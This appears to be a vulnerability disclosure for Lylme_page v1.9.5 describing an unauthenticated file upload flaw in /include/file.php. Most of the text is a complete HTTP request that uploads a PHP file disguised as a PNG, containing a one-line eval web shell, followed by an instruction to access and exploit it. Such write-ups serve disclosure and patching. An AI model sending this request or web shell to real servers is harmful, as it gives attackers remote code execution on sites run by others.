Lylme_pagev1.9.5 has a file upload vulnerability in the front-end of the website.

In the/apply/index.php directory, grab packages uploaded from website icons, and construct it accordingly

![image-20240506161607812](https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240506161607812.png)

```
POST /include/file.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Origin: http://127.0.0.1
Accept: application/json, text/javascript, */*; q=0.01
Cookie: X8Kk_2132_logintime=1713010988; X8Kk_2132_saltkey=sb50OXyE; X8Kk_2132_lastvisit=1713007324; XDEBUG_SESSION=PHPSTORM; admin_hkcms_lang=zh-cn; index_hkcms_lang=zh-cn; HKCMSSESSID=e0594fc037c66b2dcc477b032c98de35; PHPSESSID=jbl3he9k1riq937d993fc7luhi; admin_token=32cffj4RQkD5uVfTy3J25h8COeBWUDMFyPZMgE%2BSw2eAI1O%2FgJsuTSHq0vIvSxsREnWeNg59eXDvZU%2F6gdzPT3acrQ
Content-Type: multipart/form-data; boundary=---------------------------207262699182048909098055515
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Dest: empty
Sec-Fetch-Site: same-origin
Referer: http://127.0.0.1/apply/
Content-Length: 237

-----------------------------207262699182048909098055515
Content-Disposition: form-data; name="file"; filename="mm.php"
Content-Type: image/png

<?php eval($_POST[1]);?>
-----------------------------207262699182048909098055515--

```

![image-20240506161508365](https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240506161508365.png)

Access and exploit this vulnerability

![image-20240506161502190](https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240506161502190.png)
